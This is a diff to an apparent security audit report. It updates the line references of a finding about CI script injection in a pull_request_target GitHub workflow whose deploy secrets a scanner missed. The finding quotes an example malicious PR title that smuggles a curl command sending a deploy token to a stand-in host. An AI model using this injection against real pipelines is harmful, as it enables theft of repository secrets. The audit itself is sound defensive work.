@@ -52,7 +52,7 @@ tools and pattern-matching reviewers skip.
 
 | # | Issue | Location | Category | Scanner |
 |---|-------|----------|----------|---------|
-| V-C5 | **CI script injection in a secret-bearing, fork-triggerable workflow** — `${{ github.event.pull_request.title }}` / `.body` are interpolated straight into a `run:` shell step; the job holds `SLACK_WEBHOOK` and `PROVIDER_SVC_DEPLOY_TOKEN`; the trigger is `pull_request_target` (so a fork PR runs with repo secrets in scope). A PR titled `"; curl evil/$PROVIDER_SVC_DEPLOY_TOKEN #` executes on the runner. Compounded by unpinned actions (`auto-labeler@v1` moving tag, `github-script@main`). | `.github/workflows/pr-triage.yml:6, 26–31, 36–37` | Poisoned-pipeline / command injection (CWE-78 + insecure CI) | **MISSED** (despite scope claim) |
+| V-C5 | **CI script injection in a secret-bearing, fork-triggerable workflow** — `${{ github.event.pull_request.title }}` / `.body` are interpolated straight into a `run:` shell step; the job holds `SLACK_WEBHOOK` and `PROVIDER_SVC_DEPLOY_TOKEN`; the trigger is `pull_request_target` (so a fork PR runs with repo secrets in scope). A PR titled `"; curl evil/$PROVIDER_SVC_DEPLOY_TOKEN #` executes on the runner. Compounded by unpinned actions (`auto-labeler@v1` moving tag, `github-script@main`). | `.github/workflows/pr-triage.yml:6, 26–31, 35, 41` | Poisoned-pipeline / command injection (CWE-78 + insecure CI) | **MISSED** (despite scope claim) |
 
 This is the highest-severity thing the scanner missed — same lesson as V1's CI
 finding, a different anti-pattern (V1 leaked secrets by checking out untrusted head;
